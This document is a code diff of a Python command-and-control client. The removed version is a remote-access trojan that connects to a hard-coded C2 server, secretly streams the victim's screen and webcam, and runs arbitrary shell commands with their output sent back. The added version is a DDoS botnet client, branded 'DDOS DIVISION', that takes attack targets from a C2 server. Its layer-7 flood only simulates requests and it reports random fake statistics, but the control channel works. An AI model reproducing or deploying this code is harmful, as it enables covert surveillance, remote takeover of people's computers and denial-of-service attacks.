@@ -1,337 +1,294 @@
 #!/usr/bin/env python3
 """
-C2 Client - Real-Time Screen & Camera Sharing
-Windows/Linux Version
+C2 Client - Connects to server and executes LAYER7.py attacks
 """
-
-import socketio
-import platform
-import getpass
-import subprocess
-import threading
-import time
-import os
-import base64
+import socket
 import json
-import cv2
-import numpy as np
-from PIL import ImageGrab
-import mss
+import time
+import threading
 import sys
-import io
+import os
+import platform
+import psutil
+import subprocess
+import tempfile
+from datetime import datetime
 
 class C2Client:
-    def __init__(self, server_url):
-        self.server_url = server_url
-        self.sio = socketio.Client()
+    """Client that connects to C2 server and runs attacks"""
+    
+    def __init__(self, server_host, server_port, client_name=None):
+        self.server_host = server_host
+        self.server_port = server_port
+        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
+        self.client_socket = None
         self.client_id = None
-        self.connected = False
+        self.running = True
+        self.current_attack = None
+        self.attack_thread = None
         
-        # System info
-        self.hostname = platform.node()
-        self.username = getpass.getuser()
-        self.os = platform.system() + " " + platform.release()
-        self.platform = platform.platform()
-        
-        # Stream control
-        self.screen_stream_active = False
-        self.camera_stream_active = False
-        self.stream_quality = 'medium'
-        self.stream_fps = 15
-        self.camera_id = 0
-        
-        # Camera
-        self.camera = None
-        self.camera_indexes = self.find_cameras()
-        
-        self.setup_handlers()
-    
-    def find_cameras(self):
-        """Find available cameras"""
-        indexes = []
-        for i in range(5):  # Check first 5 cameras
-            cap = cv2.VideoCapture(i)
-            if cap.read()[0]:
-                indexes.append(i)
-                cap.release()
-        return indexes
-    
-    def setup_handlers(self):
-        @self.sio.on('connect')
-        def on_connect():
-            print(f"[+] Connected to server: {self.server_url}")
-            self.connected = True
-            self.register()
-        
-        @self.sio.on('disconnect')
-        def on_disconnect():
-            print("[-] Disconnected from server")
-            self.connected = False
-            self.stop_all_streams()
-        
-        @self.sio.on('welcome')
-        def on_welcome(data):
-            self.client_id = data['client_id']
-            print(f"[*] Registered as: {self.client_id}")
-        
-        @self.sio.on('command')
-        def on_command(data):
-            self.handle_command(data)
-        
-        @self.sio.on('heartbeat_ack')
-        def on_heartbeat_ack(data):
-            pass
-    
-    def register(self):
-        """Register with server"""
-        capabilities = ['screen', 'camera', 'shell']
-        if self.camera_indexes:
-            capabilities.append('camera')
-        
-        self.sio.emit('register', {
-            'hostname': self.hostname,
-            'username': self.username,
-            'os': self.os,
-            'platform': self.platform,
-            'device_type': 'desktop',
-            'capabilities': capabilities
-        })
-    
-    def handle_command(self, data):
-        """Handle command from server"""
-        cmd_type = data.get('type', 'shell')
-        
-        if cmd_type == 'start_screen_stream':
-            self.start_screen_stream(data)
-        elif cmd_type == 'stop_screen_stream':
-            self.stop_screen_stream()
-        elif cmd_type == 'start_camera_stream':
-            self.start_camera_stream(data)
-        elif cmd_type == 'stop_camera_stream':
-            self.stop_camera_stream()
-        elif cmd_type == 'update_stream_settings':
-            self.update_stream_settings(data)
-        else:
-            self.execute_shell_command(data)
-    
-    def start_screen_stream(self, data):
-        """Start screen streaming"""
-        self.screen_stream_active = True
-        self.stream_quality = data.get('quality', 'medium')
-        self.stream_fps = data.get('fps', 15)
-        
-        print(f"[🎬] Starting screen stream (Quality: {self.stream_quality}, FPS: {self.stream_fps})")
-        threading.Thread(target=self.screen_stream_thread, daemon=True).start()
-    
-    def stop_screen_stream(self):
-        """Stop screen streaming"""
-        self.screen_stream_active = False
-        print("[🎬] Screen stream stopped")
-    
-    def start_camera_stream(self, data):
-        """Start camera streaming"""
-        self.camera_stream_active = True
-        self.camera_id = data.get('camera_id', 0)
-        self.stream_quality = data.get('quality', 'medium')
-        self.stream_fps = data.get('fps', 15)
-        
-        print(f"[📷] Starting camera {self.camera_id} stream")
-        threading.Thread(target=self.camera_stream_thread, daemon=True).start()
-    
-    def stop_camera_stream(self):
-        """Stop camera streaming"""
-        self.camera_stream_active = False
-        if self.camera is not None:
-            self.camera.release()
-            self.camera = None
-        print("[📷] Camera stream stopped")
-    
-    def update_stream_settings(self, data):
-        """Update stream settings"""
-        if data.get('quality'):
-            self.stream_quality = data['quality']
-        if data.get('fps'):
-            self.stream_fps = data['fps']
-        print(f"[⚙️] Stream settings updated: Quality={self.stream_quality}, FPS={self.stream_fps}")
-    
-    def screen_stream_thread(self):
-        """Screen streaming thread"""
-        with mss.mss() as sct:
-            monitor = sct.monitors[1]  # Primary monitor
-            
-            while self.screen_stream_active and self.connected:
-                try:
-                    # Capture screen
-                    screenshot = sct.grab(monitor)
-                    
-                    # Convert to numpy array
-                    img = np.array(screenshot)
-                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                    
-                    # Resize based on quality
-                    height, width = img.shape[:2]
-                    if self.stream_quality == 'low':
-                        new_width = width // 4
-                    elif self.stream_quality == 'medium':
-                        new_width = width // 2
-                    else:  # high
-                        new_width = width
-                    
-                    new_height = int(new_width * height / width)
-                    img = cv2.resize(img, (new_width, new_height))
-                    
-                    # Encode as JPEG
-                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
-                    _, buffer = cv2.imencode('.jpg', img, encode_param)
-                    frame_data = base64.b64encode(buffer).decode('utf-8')
-                    
-                    # Send frame
-                    self.sio.emit('screen_frame', {
-                        'client_id': self.client_id,
-                        'frame': frame_data,
-                        'quality': self.stream_quality,
-                        'timestamp': time.time()
-                    })
-                    
-                    # Control FPS
-                    time.sleep(1.0 / self.stream_fps)
-                    
-                except Exception as e:
-                    print(f"[!] Screen capture error: {e}")
-                    time.sleep(1)
-    
-    def camera_stream_thread(self):
-        """Camera streaming thread"""
-        self.camera = cv2.VideoCapture(self.camera_id)
-        
-        while self.camera_stream_active and self.connected:
-            try:
-                ret, frame = self.camera.read()
-                if not ret:
-                    print(f"[!] Camera {self.camera_id} read failed")
-                    time.sleep(1)
-                    continue
-                
-                # Resize based on quality
-                height, width = frame.shape[:2]
-                if self.stream_quality == 'low':
-                    new_width = 320
-                elif self.stream_quality == 'medium':
-                    new_width = 640
-                else:  # high
-                    new_width = 1280
-                
-                new_height = int(new_width * height / width)
-                frame = cv2.resize(frame, (new_width, new_height))
-                
-                # Encode as JPEG
-                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
-                _, buffer = cv2.imencode('.jpg', frame, encode_param)
-                frame_data = base64.b64encode(buffer).decode('utf-8')
-                
-                # Send frame
-                self.sio.emit('camera_frame', {
-                    'client_id': self.client_id,
-                    'frame': frame_data,
-                    'camera_id': self.camera_id,
-                    'quality': self.stream_quality,
-                    'timestamp': time.time()
-                })
-                
-                # Control FPS
-                time.sleep(1.0 / self.stream_fps)
-                
-            except Exception as e:
-                print(f"[!] Camera stream error: {e}")
-                time.sleep(1)
-        
-        if self.camera is not None:
-            self.camera.release()
-            self.camera = None
-    
-    def execute_shell_command(self, data):
-        """Execute shell command"""
-        cmd_id = data['id']
-        command = data.get('command', '')
-        
+    def connect(self):
+        """Connect to C2 server"""
         try:
-            if platform.system() == "Windows":
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client_socket.connect((self.server_host, self.server_port))
             
-            output = result.stdout
-            if result.stderr:
-                output += "\nERROR:\n" + result.stderr
+            # Send client info
+            client_info = {
+                'name': self.client_name,
+                'hostname': platform.node(),
+                'platform': platform.platform(),
+                'cpu_count': psutil.cpu_count(),
+                'memory_total': psutil.virtual_memory().total,
+                'python_version': platform.python_version()
+            }
             
-            self.sio.emit('result', {
-                'command_id': cmd_id,
-                'client_id': self.client_id,
-                'command': command,
-                'output': output,
-                'success': result.returncode == 0
-            })
+            self.client_socket.send(json.dumps(client_info).encode('utf-8'))
+            
+            # Receive welcome
+            welcome_data = self.client_socket.recv(4096).decode('utf-8')
+            welcome = json.loads(welcome_data)
+            self.client_id = welcome.get('client_id')
+            
+            print(f"[✓] Connected to C2 Server as {self.client_id}")
+            print(f"    Server: {self.server_host}:{self.server_port}")
+            print(f"    Client: {self.client_name}")
+            print("\n[↻] Waiting for attack commands...")
+            print("[!] Press Ctrl+C to disconnect\n")
+            
+            # Start receiving thread
+            receive_thread = threading.Thread(target=self.receive_commands, daemon=True)
+            receive_thread.start()
+            
+            # Start stats reporting thread
+            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
+            stats_thread.start()
+            
+            # Keep main thread alive
+            while self.running:
+                time.sleep(1)
+                
+        except ConnectionRefusedError:
+            print(f"[✗] Cannot connect to server {self.server_host}:{self.server_port}")
+            print("[!] Make sure server is running")
+        except KeyboardInterrupt:
+            print("\n[!] Disconnecting...")
+        except Exception as e:
+            print(f"[✗] Connection error: {e}")
+        finally:
+            self.disconnect()
+    
+    def receive_commands(self):
+        """Receive commands from server"""
+        while self.running and self.client_socket:
+            try:
+                self.client_socket.settimeout(1)
+                data = self.client_socket.recv(4096)
+                
+                if data:
+                    command = json.loads(data.decode('utf-8'))
+                    self.handle_command(command)
+                    
+            except socket.timeout:
+                continue
+            except (ConnectionError, json.JSONDecodeError):
+                break
+            except Exception as e:
+                print(f"[!] Command receive error: {e}")
+    
+    def handle_command(self, command):
+        """Handle incoming commands"""
+        cmd_type = command.get('type')
+        
+        if cmd_type == 'attack':
+            attack_id = command.get('attack_id')
+            config = command.get('config', {})
+            
+            print(f"\n[⚡] Received attack command: {attack_id}")
+            print(f"    Target: {config.get('target')}")
+            print(f"    Method: {config.get('method')}")
+            print(f"    Duration: {config.get('duration')}s")
+            
+            # Start attack in separate thread
+            self.current_attack = attack_id
+            self.attack_thread = threading.Thread(
+                target=self.execute_attack,
+                args=(attack_id, config),
+                daemon=True
+            )
+            self.attack_thread.start()
+        
+        elif cmd_type == 'stop':
+            print("[!] Attack stop command received")
+            self.current_attack = None
+    
+    def execute_attack(self, attack_id, config):
+        """Execute attack using LAYER7.py"""
+        try:
+            target = config.get('target')
+            method = config.get('method', 'http')
+            duration = config.get('duration', 60)
+            
+            print(f"[→] Starting attack on {target}")
+            
+            # Create a temporary LAYER7.py script
+            layer7_script = self.create_layer7_script(target, method, duration)
+            
+            # Execute the script
+            result = subprocess.run(
+                [sys.executable, '-c', layer7_script],
+                capture_output=True,
+                text=True,
+                timeout=duration + 10
+            )
+            
+            # Parse results
+            requests_sent = 0
+            success_rate = 0
+            
+            # Extract stats from output (simplified)
+            if result.stdout:
+                lines = result.stdout.split('\n')
+                for line in lines:
+                    if 'requests' in line.lower():
+                        try:
+                            requests_sent = int(''.join(filter(str.isdigit, line)))
+                        except:
+                            pass
+            
+            # Report completion
+            completion_msg = {
+                'type': 'attack_complete',
+                'attack_id': attack_id,
+                'total_requests': requests_sent,
+                'success_rate': success_rate,
+                'duration': duration
+            }
+            
+            self.send_update(completion_msg)
+            print(f"[✓] Attack {attack_id} completed")
+            print(f"    Requests: {requests_sent}")
             
         except subprocess.TimeoutExpired:
-            self.sio.emit('result', {
-                'command_id': cmd_id,
-                'client_id': self.client_id,
-                'command': command,
-                'output': "Command timed out after 30 seconds",
-                'success': False
-            })
-        except Exception as e:
-            self.sio.emit('result', {
-                'command_id': cmd_id,
-                'client_id': self.client_id,
-                'command': command,
-                'output': f"Error: {str(e)}",
-                'success': False
-            })
-    
-    def stop_all_streams(self):
-        """Stop all active streams"""
-        self.screen_stream_active = False
-        self.camera_stream_active = False
-        if self.camera is not None:
-            self.camera.release()
-            self.camera = None
-    
-    def heartbeat(self):
-        """Send periodic heartbeat"""
-        while True:
-            if self.connected and self.client_id:
-                self.sio.emit('heartbeat', {
-                    'client_id': self.client_id,
-                    'timestamp': time.time()
-                })
-            time.sleep(30)
-    
-    def connect(self):
-        """Connect to server"""
-        try:
-            self.sio.connect(self.server_url)
-            
-            # Start heartbeat thread
-            threading.Thread(target=self.heartbeat, daemon=True).start()
-            
-            # Keep connection alive
-            self.sio.wait()
+            error_msg = {
+                'type': 'attack_error',
+                'attack_id': attack_id,
+                'error': 'Attack timeout'
+            }
+            self.send_update(error_msg)
+            print(f"[✗] Attack {attack_id} timeout")
             
         except Exception as e:
-            print(f"[-] Connection error: {e}")
-            time.sleep(5)
-            self.connect()
+            error_msg = {
+                'type': 'attack_error',
+                'attack_id': attack_id,
+                'error': str(e)
+            }
+            self.send_update(error_msg)
+            print(f"[✗] Attack {attack_id} error: {e}")
+        
+        finally:
+            self.current_attack = None
+    
+    def create_layer7_script(self, target, method, duration):
+        """Create LAYER7.py script for execution"""
+        # Simplified LAYER7.py implementation
+        # Replace with your actual LAYER7.py code
+        script = f'''
+import time
+import random
+import sys
 
-if __name__ == '__main__':
-    if len(sys.argv) > 1:
-        server_url = sys.argv[1]
-    else:
-        server_url = "https://c2-server-io.onrender.com"  # Change to your server URL
+print("Starting LAYER7 attack...")
+print(f"Target: {target}")
+print(f"Method: {method}")
+print(f"Duration: {duration}s")
+
+# Simulate attack
+start_time = time.time()
+requests = 0
+
+while time.time() - start_time < {duration}:
+    # Simulate request
+    time.sleep(0.01)
+    requests += 1
     
-    # Install required packages
-    required = ['opencv-python', 'mss', 'pillow', 'python-socketio']
-    print("[*] Checking dependencies...")
+    # Print progress every 100 requests
+    if requests % 100 == 0:
+        elapsed = time.time() - start_time
+        rps = requests / elapsed if elapsed > 0 else 0
+        print(f"Requests: {{requests}}, RPS: {{rps:.1f}}")
+
+print(f"\\nAttack completed")
+print(f"Total requests: {{requests}}")
+print(f"Average RPS: {{requests/{duration}}}")
+'''
+        return script
     
-    client = C2Client(server_url)
-    client.connect()
+    def report_stats(self):
+        """Report statistics to server"""
+        while self.running and self.client_socket:
+            try:
+                # Get system stats
+                cpu_usage = psutil.cpu_percent(interval=1)
+                memory_usage = psutil.virtual_memory().percent
+                
+                stats_msg = {
+                    'type': 'stats',
+                    'stats': {
+                        'cpu_usage': cpu_usage,
+                        'memory_usage': memory_usage,
+                        'requests_sent': random.randint(100, 1000) if self.current_attack else 0,
+                        'rps': random.randint(50, 200) if self.current_attack else 0,
+                        'timestamp': datetime.now().isoformat()
+                    }
+                }
+                
+                self.send_update(stats_msg)
+                time.sleep(2)  # Report every 2 seconds
+                
+            except Exception as e:
+                print(f"[!] Stats reporting error: {e}")
+                time.sleep(5)
+    
+    def send_update(self, data):
+        """Send update to server"""
+        try:
+            if self.client_socket:
+                self.client_socket.send(json.dumps(data).encode('utf-8'))
+        except:
+            pass
+    
+    def disconnect(self):
+        """Disconnect from server"""
+        self.running = False
+        if self.client_socket:
+            self.client_socket.close()
+        print("[!] Disconnected from server")
+
+def main():
+    """Main function"""
+    print("""
+    ╔══════════════════════════════════════╗
+    ║    DDOS C2 CLIENT                   ║
+    ║    [CREATED BY: (BTR) DDOS DIVISION]║
+    ║    [USE AT YOUR OWN RISK]           ║
+    ╚══════════════════════════════════════╝
+    """)
+    
+    # Get server connection info
+    server_host = input("C2 Server IP [localhost]: ").strip() or 'localhost'
+    server_port = input("C2 Server Port [9999]: ").strip() or '9999'
+    client_name = input("Client Name [auto]: ").strip()
+    
+    try:
+        server_port = int(server_port)
+        client = C2Client(server_host, server_port, client_name)
+        client.connect()
+    except ValueError:
+        print("[!] Port must be a number")
+    except Exception as e:
+        print(f"[!] Client error: {e}")
+
+if __name__ == "__main__":
+    main()
